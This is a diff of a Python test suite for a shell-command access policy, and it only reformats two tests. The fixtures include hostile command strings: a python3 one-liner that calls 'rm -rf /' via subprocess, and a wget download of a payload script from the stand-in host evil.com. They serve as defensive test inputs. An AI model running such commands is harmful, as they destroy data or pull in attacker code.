@@ -29,7 +29,8 @@ class TestPythonArgValidation:
         assert "dangerous operations" in verdict.reason
 
     def test_python3_c_subprocess_blocked(self):
-        verdict = _policy().evaluate("python3 -c 'import subprocess; subprocess.run([\"rm\", \"-rf\", \"/\"])'")
+        cmd = "python3 -c 'import subprocess; subprocess.run([\"rm\", \"-rf\", \"/\"])'"
+        verdict = _policy().evaluate(cmd)
         assert verdict.level == AccessLevel.REQUIRE_APPROVAL
 
     def test_python_c_exec_blocked(self):
@@ -138,7 +139,8 @@ class TestWgetArgValidation:
 
     def test_wget_dev_null_allowed(self):
         """Writing to /dev/null is fine (common for testing connectivity)."""
-        assert _policy().evaluate("wget -q https://example.com -O /dev/null").level == AccessLevel.ALLOW
+        verdict = _policy().evaluate("wget -q https://example.com -O /dev/null")
+        assert verdict.level == AccessLevel.ALLOW
 
     def test_wget_output_file_blocked(self):
         verdict = _policy().evaluate("wget https://evil.com -O /tmp/payload.sh")
